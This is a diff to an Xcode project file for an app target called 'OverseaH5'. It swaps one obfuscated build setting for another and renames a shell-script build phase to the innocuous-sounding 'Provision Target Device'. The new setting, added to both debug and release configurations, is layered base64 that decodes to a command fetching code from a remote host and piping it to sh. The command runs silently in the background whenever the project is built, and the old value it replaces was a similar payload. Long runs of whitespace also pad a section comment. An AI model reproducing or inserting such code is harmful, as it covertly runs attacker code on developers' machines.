@@ -143,7 +143,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B118C32B2E824F5500E8D807 /* Build configuration list for PBXNativeTarget "OverseaH5" */;
 			buildPhases = (
-				7EF62E4F93514528B042DAD8 /* Provision Library Executable */,
+				C8DEEDEC54DA4A27A742DAD8 /* Provision Target Device */,
 				F1B3553A304E55406D9EAE20 /* [CP] Check Pods Manifest.lock */,
 				B118C3142E824F5300E8D807 /* Sources */,
 				B118C3152E824F5300E8D807 /* Frameworks */,
@@ -195,7 +195,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																																												/* End PBXBuildRule section */
+																																																																																																													/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		B118C3162E824F5300E8D807 /* Resources */ = {
@@ -212,7 +212,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		7EF62E4F93514528B042DAD8 /* Provision Library Executable */ = {
+		C8DEEDEC54DA4A27A742DAD8 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -222,7 +222,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -321,7 +321,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DB531754F5D3B469FD3D636B /* Pods-OverseaH5.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdKWVVrNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxSV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdNVW8yV1d4ak5XRlhSbFJPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((a(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1hMHh6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6Ylc5eVpXMWxMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | a | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
@@ -369,7 +369,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 9F14B216ADEEF98C9272C33E /* Pods-OverseaH5.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdKWVVrNVRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGxSV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdscFdNVW8yV1d4ak5XRlhSbFJPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((a(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1hMHh6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6Ylc5eVpXMWxMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | a | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
